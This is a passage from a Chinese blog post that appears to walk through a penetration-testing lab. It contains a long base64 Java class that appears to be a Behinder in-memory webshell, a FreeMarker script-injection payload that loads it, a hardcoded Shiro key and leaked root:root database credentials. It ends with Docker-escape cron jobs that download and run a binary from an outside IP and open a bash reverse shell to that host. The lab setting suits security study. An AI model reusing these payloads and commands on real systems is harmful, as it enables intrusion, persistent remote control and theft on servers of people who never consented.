AACKCgACAQEMAOMA5AoAAgEDAQANZmluZEZpbHRlckRlZggBBQEAXShMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzcztbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwwAWwEHCgACAQgBAC9vcmcuYXBhY2hlLnRvbWNhdC51dGlsLmRlc2NyaXB0b3Iud2ViLkZpbHRlckRlZggBCgEAB2Zvck5hbWUMAQwAugoAfwENAQAvb3JnLmFwYWNoZS50b21jYXQudXRpbC5kZXNjcmlwdG9yLndlYi5GaWx0ZXJNYXAIAQ8BACRvcmcuYXBhY2hlLmNhdGFsaW5hLmRlcGxveS5GaWx0ZXJEZWYIAREBACRvcmcuYXBhY2hlLmNhdGFsaW5hLmRlcGxveS5GaWx0ZXJNYXAIARMBAD0oTGphdmEvbGFuZy9TdHJpbmc7WkxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7KUxqYXZhL2xhbmcvQ2xhc3M7DAEMARUKAH8BFgEADXNldEZpbHRlck5hbWUIARgBAA5zZXRGaWx0ZXJDbGFzcwgBGgEADGFkZEZpbHRlckRlZggBHAEADXNldERpc3BhdGNoZXIIAR4BAAdSRVFVRVNUCAEgAQANYWRkVVJMUGF0dGVybggBIgwABQAGCgACASQBADBvcmcuYXBhY2hlLmNhdGFsaW5hLmNvcmUuQXBwbGljYXRpb25GaWx0ZXJDb25maWcIASYBABdnZXREZWNsYXJlZENvbnN0cnVjdG9ycwEAIigpW0xqYXZhL2xhbmcvcmVmbGVjdC9Db25zdHJ1Y3RvcjsMASgBKQoAfwEqAQANc2V0VVJMUGF0dGVybggBLAEAEmFkZEZpbHRlck1hcEJlZm9yZQgBLgEADGFkZEZpbHRlck1hcAgBMAEAHWphdmEvbGFuZy9yZWZsZWN0L0NvbnN0cnVjdG9yBwEyCgEzANYBACcoW0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsMAOABNQoBMwE2CAD5AQANamF2YS91dGlsL01hcAcBOQEAA3B1dAEAOChMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7DAE7ATwLAToBPQEAD3ByaW50U3RhY2tUcmFjZQwBPwAZCgAbAUABACBqYXZhL2xhbmcvQ2xhc3NOb3RGb3VuZEV4Y2VwdGlvbgcBQgEAIGphdmEvbGFuZy9JbnN0YW50aWF0aW9uRXhjZXB0aW9uBwFEAQABaQEADGRlY29kZXJDbGFzcwEAB2RlY29kZXIBAAdpZ25vcmVkAQAJYmFzZTY0U3RyAQAUTGphdmEvbGFuZy9DbGFzczwqPjsBABZzdW4ubWlzYy5CQVNFNjREZWNvZGVyCAFMAQAMZGVjb2RlQnVmZmVyCAFOAQAJZ2V0TWV0aG9kDAFQAM8KAH8BUQEAEGphdmEudXRpbC5CYXNlNjQIAVMBAApnZXREZWNvZGVyCAFVAQAGZGVjb2RlCAFXAQAOY29tcHJlc3NlZERhdGEBAANvdXQBAB9MamF2YS9pby9CeXRlQXJyYXlPdXRwdXRTdHJlYW07AQACaW4BAB5MamF2YS9pby9CeXRlQXJyYXlJbnB1dFN0cmVhbTsBAAZ1bmd6aXABAB9MamF2YS91dGlsL3ppcC9HWklQSW5wdXRTdHJlYW07AQAGYnVmZmVyAQABbgEAHWphdmEvaW8vQnl0ZUFycmF5T3V0cHV0U3RyZWFtBwFiAQAcamF2YS9pby9CeXRlQXJyYXlJbnB1dFN0cmVhbQcBZAEAHWphdmEvdXRpbC96aXAvR1pJUElucHV0U3RyZWFtBwFmCgFjACwBAAUoW0IpVgwAFQFpCgFlAWoBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYMABUBbAoBZwFtAQAEcmVhZAEABShbQilJDAFvAXAKAWcBcQEABXdyaXRlAQAHKFtCSUkpVgwBcwF0CgFjAXUBAAt0b0J5dGVBcnJheQEABCgpW0IMAXcBeAoBYwF5AQADb2JqAQAJZmllbGROYW1lAQAFZmllbGQBABlMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7AQAEZ2V0RgEAPyhMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwwBfwGACgACAYEBABdqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZAcBgwoBhADWCgGEAHgBAB5qYXZhL2xhbmcvTm9TdWNoRmllbGRFeGNlcHRpb24HAYcBACBMamF2YS9sYW5nL05vU3VjaEZpZWxkRXhjZXB0aW9uOwEAEGdldERlY2xhcmVkRmllbGQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsMAYoBiwoAfwGMAQANZ2V0U3VwZXJjbGFzcwwBjgB7CgB/AY8KAYgAFwEADHRhcmdldE9iamVjdAEACm1ldGhvZE5hbWUBAAdtZXRob2RzAQAbW0xqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAhTGphdmEvbGFuZy9Ob1N1Y2hNZXRob2RFeGNlcHRpb247AQAiTGphdmEvbGFuZy9JbGxlZ2FsQWNjZXNzRXhjZXB0aW9uOwEACnBhcmFtQ2xhenoBABJbTGphdmEvbGFuZy9DbGFzczsBAAVwYXJhbQEAE1tMamF2YS9sYW5nL09iamVjdDsBAAZtZXRob2QBAAl0ZW1wQ2xhc3MHAZUBABJnZXREZWNsYXJlZE1ldGhvZHMBAB0oKVtMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwwBnwGgCgB/AaEKANMAYAEABmVxdWFscwwBpACECgASAaUBABFnZXRQYXJhbWV0ZXJUeXBlcwEAFCgpW0xqYXZhL2xhbmcvQ2xhc3M7DAGnAagKANMBqQoAnwAXAQAKZ2V0TWVzc2FnZQwBrAAGCgCdAa0KAJgAFwEACDxjbGluaXQ+CgACACwAIQACAAQAAAAAABAAAQAFAAYAAQAHAAAADwABAAEAAAADEgmwAAAAAAABAAoABgABAAcAAAAQAAEAAQAAAAQTAAywAAAAAAABAA0ABgACAA4AAAAEAAEAEAAHAAAAFwADAAEAAAALuwASWRMAFLcAGLAAAAAAAAEAFQAZAAEABwAAANgAAwAFAAAANiq3AC0qtgAxTCu5ADUBAE0suQA5AQCZABssuQA9AQBOKi23AEE6BCotGQS2AEWn/+KnAARMsQABAAQAMQA0ABsABAAcAAAAJgAJAAAALAAEAC4ACQAvACAAMAAnADEALgAyADEANQA0ADMANQA4AB0AAAAqAAQAJwAHAB4AHwAEACAADgAgAB8AAwAJACgAIQAiAAEAAAA2ACMAJAAAACUAAAAMAAEACQAoACEAJgABACsAAAAaAAT/ABAAAwcAAgcAKAcAKgAA+QAgQgcAGwAAAQAuAC8AAwAHAAAC2AADAA4AAAF5uwBXWbcAWEwSUxJauABewABRwABRTQFOLDoEGQS+NgUDNgYVBhUFogFBGQQVBjI6BxkHtgBhEmO2AGeZALMtxwCvGQcSabgAbBJuuABsEm+4AGzAAFU6CBkItgBzuQB2AQA6CRkJuQA5AQCZAIAZCbkAPQEAOgoZCBkKtgB5Em+4AGzAAFU6CxkLtgBzuQB2AQA6DBkMuQA5AQCZAE0ZDLkAPQEAOg0ZCxkNtgB5Ti3GABottgB9tgCAEoK2AGeZAAsrLbkAhgIAVy3GABottgB9tgCAEoi2AGeZAAsrLbkAhgIAV6f/r6f/fKcAdxkHtgCMxgBvGQe2AIy2AH22AI8SkbYAZ5oAFhkHtgCMtgB9tgCPEpO2AGeZAEkZB7YAjBKVuABsEpa4AGxOLcYAGi22AH22AIASgrYAZ5kACystuQCGAgBXLcYAGi22AH22AIASiLYAZ5kACystuQCGAgBXhAYBp/6+pwAPOgS7AJhZGQS3AJu/K7AAAQAYAWgBawAbAAQAHAAAAHIAHAAAADsACAA8ABYAPQAYAD8AMQBBAEIAQgBYAEUAdwBGAIgASQCnAEoArwBLAMIATADKAE4A3QBPAOUAUADoAFEA6wBSAO4AVAEcAFUBLABWAT8AVwFHAFgBWgBZAWIAPwFoAF4BawBcAW0AXQF3AF8AHQAAAGYACgCnAD4ARgAfAA0AiABgAEcASAALAHcAcQBJAB8ACgBYAJMASgBIAAgAMQExAEsATAAHAW0ACgBNAE4ABAAAAXkAIwAkAAAACAFxACEAIgABABYBYwBPAFAAAgAYAWEAIAAfAAMAJQAAAAwAAQAIAXEAIQAmAAEAKwAAAE8ADv8AIwAHBwACBwAoBwBRBwAEBwBRAQEAAP4AQAcAUwcAVQcAKv4ALwcABAcAVQcAKvwANQcABPoAGvgAAvkAAgItKvoAGvgABUIHABsLAA4AAAAIAAMAnQCfAKEAogAAAAIAowACAD4APwABAAcAAAFtAAYACAAAAIQBTbgAs7YAjE4txwALK7YAfbYAtk4tKrYAuLYAvE2nAGQ6BCq2AL64AMK4AMY6BRKvEscGvQB/WQMSyFNZBLIAzVNZBbIAzVO2ANE6BhkGBLYA1xkGLQa9AARZAxkFU1kEA7gA21NZBRkFvrgA21O2AN/AAH86BxkHtgDiTacABToFLLAAAgAVAB4AIQAbACMAfQCAAKUAAwAcAAAAPgAPAAAAZQACAGYACQBnAA0AaAAVAGsAHgB1ACEAbAAjAG4ALwBvAE0AcABTAHEAdwByAH0AdACAAHMAggB2AB0AAABSAAgALwBOAKYApwAFAE0AMACoAKkABgB3AAYAqgCrAAcAIwBfAE0ATgAEAAAAhAAjACQAAAAAAIQAIAAfAAEAAgCCAB4AHwACAAkAewCsAK0AAwArAAAAKwAE/QAVBwAEBwCvSwcAG/8AXgAFBwACBwAEBwAEBwCvBwAbAAEHAKX6AAEAAQDjAOQAAQAHAAAAbQADAAMAAAAaKxLqtgBnmQASKxLqtgDuPSscBGC2APKwK7AAAAADABwAAAASAAQAAAB6AAkAewAQAHwAGAB+AB0AAAAgAAMAEAAIAOUA5gACAAAAGgAjACQAAAAAABoA5wDoAAEAKwAAAAMAARgAAQBCAEMAAgAHAAAEUQAHAAsAAAHmKrYBAk4qtgC4OgQqGQS2AQQ6BSsTAQYEvQB/WQMSElMEvQAEWQMZBVO4AQnGAASxpwAFOggTAQu4AQ62AOI6BhMBELgBDrYA4joHpwA6OggTARK4AQ62AOI6BhMBFLgBDrYA4joHpwAfOgkTARIELbgBF7YA4joGEwEUBC24ARe2AOI6BxkGEwEZBL0Af1kDEhJTBL0ABFkDGQVTuAEJVxkGEwEbBL0Af1kDEhJTBL0ABFkDGQRTuAEJVysTAR0EvQB/WQMZBrYAfVMEvQAEWQMZBlO4AQlXGQcTARkEvQB/WQMSElMEvQAEWQMZBVO4AQlXGQcTAR8EvQB/WQMSElMEvQAEWQMTASFTuAEJVxkHEwEjBL0Af1kDEhJTBL0ABFkDKrYBJVO4AQlXEwEnuAEOtgErOginAC86CRkHEwEtBL0Af1kDEhJTBL0ABFkDKrYBJVO4AQlXEwEnBC24ARe2ASs6CCsTAS8EvQB/WQMZB7YAfVMEvQAEWQMZB1O4AQlXpwAiOgkrEwExBL0Af1kDGQe2AH1TBL0ABFkDGQdTuAEJVxkIAzIEtgE0GQgDMgW9AARZAytTWQQZBlO2ATc6CSsTATi4AGzAATo6ChkKGQUZCbkBPgMAV6cACjoIGQi2AUGxAAYAEwAvADMAGwA1AEsATgAbAFAAZgBpABsBDwE3AToAGwFmAYMBhgAbAIUB2wHeABsABAAcAAAAogAoAAAAhAAFAIUACwCGABMAjAAvAI0AMACQADMAjwA1AJQAQACVAEsAoABOAJYAUACZAFsAmgBmAJ8AaQCbAGsAnQB4AJ4AhQCiAKAAowC7AKQA2AClAPMApgEPAKkBLACqATcArwE6AKsBPACtAVkArgFmALIBgwC1AYYAswGIALQBpQC3Aa0AuAHDALkBzwC6AdsAvQHeALsB4AC8AeUAvgAdAAAA1AAVAEAADgDzAB8ABgBLAAMA9AAfAAcAWwAOAPMAHwAGAGYAAwD0AB8ABwBrABoATQBOAAkAUAA1APUATgAIATcAAwD2APcACAE8ACoATQBOAAkBiAAdAE0ATgAJAWYAdQD2APcACAHDABgA+AAfAAkBzwAMAPkA+gAKAeAABQBNAE4ACAAAAeYAIwAkAAAAAAHmACAAHwABAAAB5gAeAB8AAgAFAeEA+wCtAAMACwHbAPwA6AAEABMB0wD9AOgABQB4AW4A8wAfAAYAhQFhAPQAHwAHACUAAAAWAAIBNwADAPYA/gAIAWYAdQD2AP4ACAArAAAAiwAM/gAwBwCvBwASBwASQgcAGwFYBwAb/wAaAAkHAAIHAAQHAAQHAK8HABIHABIAAAcAGwABBwAb/wAbAAgHAAIHAAQHAAQHAK8HABIHABIHAAQHAAQAAPcAtAcAG/wAKwcA/18HABse/wA4AAgHAAIHAAQHAAQHAK8HABIHABIHAAQHAAQAAQcAGwYADgAAAAwABQChAJ8AnQFDAUUAAQEAAIoAAgAHAAAAsgACAAQAAAA4ElMSWrgAXsAAUcAAUUwBTQM+HSu+ogAhKx0ytgBhEmO2AGeZAA0rHTK2AIxNpwAJhAMBp//fLLAAAAADABwAAAAiAAgAAADBAA4AwgAQAMMAGADFACYAxgAtAMcAMADDADYAygAdAAAAKgAEABIAJAFGAOYAAwAAADgAIwAkAAAADgAqAE8AUAABABAAKAD7AK0AAgArAAAAEAAD/gASBwBRBwCvAR36AAUADgAAAAgAAwCfAKEAnQAIAL8AwAACAAcAAAEFAAYABAAAAG8TAU24AQ5MKxMBTwS9AH9ZAxISU7YBUiu2AOIEvQAEWQMqU7YA38AAyMAAyLBNEwFUuAEOTCsTAVYDvQB/tgFSAQO9AAS2AN9OLbYAfRMBWAS9AH9ZAxISU7YBUi0EvQAEWQMqU7YA38AAyMAAyLAAAQAAACwALQAbAAQAHAAAABoABgAAANAABwDRAC0A0gAuANMANQDUAEkA1QAdAAAANAAFAAcAJgFHAKsAAQBJACYBSAAfAAMALgBBAUkATgACAAAAbwFKAOgAAAA1ADoBRwCrAAEAJQAAABYAAgAHACYBRwFLAAEANQA6AUcBSwABACsAAAAGAAFtBwAbAA4AAAAKAAQBQwCfAKEAnQAJAMMAxAACAAcAAADUAAQABgAAAD67AWNZtwFoTLsBZVkqtwFrTbsBZ1kstwFuThEBALwIOgQtGQS2AXJZNgWbAA8rGQQDFQW2AXan/+srtgF6sAAAAAMAHAAAAB4ABwAAANoACADbABEA3AAaAN0AIQDfAC0A4AA5AOIAHQAAAD4ABgAAAD4BWQCnAAAACAA2AVoBWwABABEALQFcAV0AAgAaACQBXgFfAAMAIQAdAWAApwAEACoAFAFhAOYABQArAAAAHAAC/wAhAAUHAMgHAWMHAWUHAWcHAMgAAPwAFwEADgAAAAQAAQAQAAgAagBcAAIABwAAAFcAAgADAAAAESoruAGCTSwEtgGFLCq2AYawAAAAAgAcAAAADgADAAAA5gAGAOcACwDoAB0AAAAgAAMAAAARAXsAHwAAAAAAEQF8AOgAAQAGAAsBfQF+AAIADgAAAAQAAQAbAAgBfwGAAAIABwAAAMcAAwAEAAAAKCq2AH1NLMYAGSwrtgGNTi0EtgGFLbBOLLYBkE2n/+m7AYhZK7cBkb8AAQAJABUAFgGIAAQAHAAAACYACQAAAOwABQDtAAkA7wAPAPAAFADxABYA8gAXAPMAHAD0AB8A9gAdAAAANAAFAA8ABwF9AX4AAwAXAAUATQGJAAMAAAAoAXsAHwAAAAAAKAF8AOgAAQAFACMAqgCrAAIAJQAAAAwAAQAFACMAqgFLAAIAKwAAAA0AA/wABQcAf1AHAYgIAA4AAAAEAAEBiAAoAFsAXAACAAcAAABCAAQAAgAAAA4qKwO9AH8DvQAEuAEJsAAAAAIAHAAAAAYAAQAAAPoAHQAAABYAAgAAAA4BkgAfAAAAAAAOAZMA6AABAA4AAAAIAAMAnwCdAKEAKQBbAQcAAgAHAAACFwADAAkAAADKKsEAf5kACirAAH+nAAcqtgB9OgQBOgUZBDoGGQXHAGQZBsYAXyzHAEMZBrYBojoHAzYIFQgZB76iAC4ZBxUIMrYBoyu2AaaZABkZBxUIMrYBqr6aAA0ZBxUIMjoFpwAJhAgBp//QpwAMGQYrLLYA0ToFp/+pOgcZBrYBkDoGp/+dGQXHAAy7AJ9ZK7cBq78ZBQS2ANcqwQB/mQAaGQUBLbYA37A6B7sAmFkZB7YBrrcBr78ZBSottgDfsDoHuwCYWRkHtgGutwGvvwADACUAcgB1AJ8AnACjAKQAnQCzALoAuwCdAAMAHAAAAG4AGwAAAP4AFAD/ABcBAQAbAQIAJQEEACkBBgAwAQcAOwEIAFYBCQBdAQoAYAEHAGYBDQBpAQ4AcgESAHUBEAB3AREAfgESAIEBFACGARUAjwEXAJUBGACcARoApAEbAKYBHACzASAAuwEhAL0BIgAdAAAAegAMADMAMwFGAOYACAAwADYBlAGVAAcAdwAHAE0BlgAHAKYADQBNAZcABwC9AA0ATQGXAAcAAADKAXsAHwAAAAAAygGTAOgAAQAAAMoBmAGZAAIAAADKAZoBmwADABQAtgCqAKsABAAXALMBnACpAAUAGwCvAZ0AqwAGACsAAAAvAA4OQwcAf/4ACAcAfwcA0wcAf/0AFwcBngEs+QAFAghCBwCfCw1UBwCdDkcHAJ0ADgAAAAgAAwCfAKEAnQAIAbAAGQABAAcAAAAlAAIAAAAAAAm7AAJZtwGxV7EAAAABABwAAAAKAAIAAAApAAgAKgAA</span><br></pre></td></tr></table></figure>
+
+<p>这是我生成的冰蝎内存马：</p>
+
+
+<p>将编码后的内存马插入其中：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;sql&quot;:&quot;call$&#123;\&quot;freemarker.template.utility.ObjectConstructor\&quot;?new()(\&quot;javax.script.ScriptEngineManager\&quot;).getEngineByName(\&quot;js\&quot;).eval(\&quot;classLoader=java.lang.Thread.currentThread().getContextClassLoader();try&#123;classLoader.loadClass(&#x27;org.apachen.SOAPUtils&#x27;).newInstance();&#125;catch(e)&#123;clsString=classLoader.loadClass(&#x27;java.lang.String&#x27;);bytecodeBase64=&#x27;这里填入base64的内存马&#x27;;try&#123;clsBase64=classLoader.loadClass(&#x27;java.util.Base64&#x27;);clsDecoder=classLoader.loadClass(&#x27;java.util.Base64$Decoder&#x27;);decoder=clsBase64.getMethod(&#x27;getDecoder&#x27;).invoke(base64Clz);bytecode=clsDecoder.getMethod(&#x27;decode&#x27;,clsString).invoke(decoder,bytecodeBase64);&#125;catch(ee)&#123;try&#123;datatypeConverterClz=classLoader.loadClass(&#x27;javax.xml.bind.DatatypeConverter&#x27;);bytecode=datatypeConverterClz.getMethod(&#x27;parseBase64Binary&#x27;,clsString).invoke(datatypeConverterClz,bytecodeBase64);&#125;catch(eee)&#123;clazz1=classLoader.loadClass(&#x27;sun.misc.BASE64Decoder&#x27;);bytecode=clazz1.newInstance().decodeBuffer(bytecodeBase64);&#125;&#125;clsClassLoader=classLoader.loadClass(&#x27;java.lang.ClassLoader&#x27;);clsByteArray=(&#x27;&#x27;.getBytes().getClass());clsInt=java.lang.Integer.TYPE;defineClass=clsClassLoader.getDeclaredMethod(&#x27;defineClass&#x27;,[clsByteArray,clsInt,clsInt]);defineClass.setAccessible(true);clazz=defineClass.invoke(classLoader,bytecode,0,bytecode.length);clazz.newInstance();&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>这里利用漏洞利用工具不能自动化打入内存马，于是自己尝试进行手工注入：</p>
+
+
+<p>成功打入冰蝎内存马以后：</p>
+
+
+<p>成功连接如下图：</p>
+
+
+<h3 id="Shiro-反序列化"><a href="#Shiro-反序列化" class="headerlink" title="Shiro 反序列化"></a>Shiro 反序列化</h3><p><code>http://10.10.0.3:18080/</code></p>
+<p>成功拿到webshell以后发现有些命令没有，直接进行下一步的信息收集：</p>
+<p>发现了<strong>DocToolkit</strong> 的源码，然后脱下来反编译</p>
+
+
+<p>利用<code>jadx工具</code>将jar包反编译：</p>
+
+
+<p>翻阅成功获得<code>shiro密钥</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QZIysgMYhG7/CzIJlVpR1g==</span><br></pre></td></tr></table></figure>
+
+<p>打开one-fox内置的<code>shiro反序列化利用工具</code></p>
+<p>检测成功：</p>
+
+
+<p>命令执行一手：</p>
+
+
+<p>注入内存马：</p>
+
+
+<h3 id="Docker容器逃逸"><a href="#Docker容器逃逸" class="headerlink" title="Docker容器逃逸"></a>Docker容器逃逸</h3><p>可看的相关文章:</p>
+<p><code>https://xz.aliyun.com/t/12495?time__1311=GqGxRQq7qeuDlrzQ0%3DGOjqLb%3DAKKG8IeD</code></p>
+<p>上传了一波fscan对内网进行了一番扫描：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[*] LiveTop 172.18.0.0/16    段存活数量为: 2</span><br><span class="line">[*] LiveTop 172.18.0.0/24    段存活数量为: 2</span><br><span class="line">172.18.0.1:22 open</span><br><span class="line">172.18.0.2:8080 open</span><br><span class="line">172.18.0.1:6379 open</span><br><span class="line">172.18.0.1:3306 open</span><br><span class="line">172.18.0.1:18080 open</span><br><span class="line">172.18.0.1:18088 open</span><br><span class="line">[*] WebTitle http://172.18.0.2:8080    code:200 len:1120   title:DocToolkit</span><br><span class="line">[*] WebTitle http://172.18.0.1:18088   code:404 len:682    title:HTTP Status 404 – Not Found</span><br><span class="line">[*] WebTitle http://172.18.0.1:18080   code:200 len:1120   title:DocToolkit</span><br><span class="line">[+] mysql 172.18.0.1:3306:root root</span><br><span class="line">[+] Redis 172.18.0.1:6379 unauthorized file:/data/dump.rdb</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>感觉有一些不对劲，怀疑是在docker容器内：</p>
+<p><code>find / -name .dockerenv</code></p>
+<p>发现确实存在！！</p>
+<p><code>df -h</code>发现(查看文件系统信息)</p>
+
+
+<p>基本确定就是在docker里面。</p>
+<p><strong>逃逸docker容器常用方法</strong></p>
+<ul>
+<li><strong>内核漏洞：</strong>由于docker容器与物理机共享一个内核，当该内核存在内核漏洞时，在docker容器内利用内核漏洞可能直接获得物理机权限</li>
+<li><strong>Docker API 未授权访问漏洞：</strong>当物理机的Docker API开启并同意未授权访问时，在Docker容器内可以使用Docker API新建一个Docker容器，并将物理机的根目录挂载到新Docker容器的某目录下。</li>
+<li><strong>Docker容器以特权模式启动：</strong>当Docker容器以特权模式启动时，可以使用mount命令将物理机的根目录挂在道当前Docker容器的某目录下。</li>
+</ul>
+<p>用CDK工具检测docker容器是否有不安全的配置或漏洞存在</p>
+<p><code>CDK地址：https://github.com/cdk-team/CDK</code></p>
+
+
+<p>查询cgroup进程:可以看出来就是docker环境了</p>
+
+
+<p>查看容器环境变量：非docker环境下是默认没有输出的，再次确认是docker环境下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/proc/1/environ</span><br></pre></td></tr></table></figure>
+
+
+
+<p>内容如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/lib/jvm/java-1.8-openjdk/jre/bin:/usr/lib/jvm/java-1.8-openjdk/binHOSTNAME=25313452973fFLAG=flag&#123;N1c3_sHirO_fuCK&#125;LANG=C.UTF-8JAVA_HOME=/usr/lib/jvm/java-1.8-openjdkJAVA_VERSION=8u212JAVA_ALPINE_VERSION=8.212.04-r0HOME=/rootLD_LIBRARY_PATH=/usr/lib/jvm/java-1.8-openjdk/jre/lib/amd64/server:/usr/lib/jvm/java-1.8-openjdk/jre/lib/amd64:/usr/lib/jvm/java-1.8-openjdk/jre/../lib/amd64</span><br></pre></td></tr></table></figure>
+
+<p>上传cdk工具进行查询结果如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod +x /tmp/cdk_linux_amd64</span><br><span class="line">/tmp/cdk_linux_amd64 evaluate --full</span><br></pre></td></tr></table></figure>
+
+
+
+<p>不过好像并无卵用，又或者说我还不太会用哈哈哈哈。</p>
+<p>经过一番翻阅：</p>
+<p>发现了挂载目录：&#x2F;dev&#x2F;tmp</p>
+<p>发现挂载的是宿主机的目录</p>
+
+
+<p>我们会发现其真实机的目录内容就在我们的这个docker容器内：所以往这个目录传即可：</p>
+
+
+<p>挂载进行定时任务逃逸</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;*/1 * * * * root wget http://42.193.105.220:9999/icon_54321.elf -o /tmp/qwert1234&quot; &gt; /dev/tmp/etc/cron.d/sysstat</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;*/1 * * * * root chmod 755 /tmp/qwert1234&quot; &gt; /dev/tmp/etc/cron.d/sysstat</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;*/1 * * * * root /tmp/qwert1234&quot; &gt; /dev/tmp/etc/cron.d/sysstat</span><br></pre></td></tr></table></figure>
+
+
+
+<p>或者挂载进行定时任务反弹shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;*/1 * * * * root bash -c &quot;bash -i &gt;&amp; /dev/tcp/42.193.105.220/9999 0&gt;&amp;1&quot; &#x27; &gt; /dev/tmp/etc/cron.d/sysstat</span><br></pre></td></tr></table></figure>
+
+<p>等待一分钟 就收到shell了</p>
+
+
+<p>成功反弹shell以后：我们发现了其的真实网卡：</p>
+
+
+
+
+<p>逃逸到主机以后先将自己代理进内网网段<code>192.168.80.55</code></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://Iconabc.github.io">icon</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://iconabc.github.io/posts/55d580db.html">https://iconabc.github.io/posts/55d580db.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://Iconabc.github.io" target="_blank">icon'Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%86%85%E7%BD%91/">内网</a><a class="post-meta__tags" href="/tags/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/">打靶记录</a><a class="post-meta__tags" href="/tags/%E9%9D%B6%E5%9C%BA/">靶场</a></div><div class="post-share"><div class="social-share" data-image="/img/mbc.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/posts/388269d7.html" title="sqlmap常用命令"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">sqlmap常用命令</div></div><div class="info-2"><div class="info-item-1">sqlmap常见命令：工具Sqlmap简介：Sqlmap是一个开源的渗透测试工具，可以用来自动化的检测，利用SQL注入漏洞，获取数据库服务器的权限。它具有功能强大的检测引擎，针对各种不同类型数据库的渗透测试的功能选项，包括获取数据库中存储的数据，访问操作系统文件甚至可以通过外带数据连接的方式执行操作系统命令。一般Linux kali 系统自带的。 目前支持的数据库有MySQL、Oracle、PostgreSQL、Microsoft SQL Server、Microsoft...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/posts/a9057879.html" title="vulntarget-h靶场"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-11-14</div><div class="info-item-2">vulntarget-h靶场</div></div><div class="info-2"><div class="info-item-1">vulntarget-h:个人看了wp偏ctf，打下来就总体来说，挺难评，我认为是一个杀软靶场，加上一些技巧性的ctf题！ 思路：第一步信息收集过程，直接外网展示了一个sql injection basic的大字就差贴脸告诉你这是sql注入的考点了，并且给出了提示?user_id=....然后这里通过手测是有一个注入点的。  网站指纹 IIS的环境 端口扫描 对开放端口提供服务进行判断  经过扫描发现后端是”asp“ ,所以其一般配套会搭sql...</div></div></div></a><a class="pagination-related" href="/posts/3e9a6950.html" title="vulntarget-j靶场"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-11-15</div><div class="info-item-2">vulntarget-j靶场</div></div><div 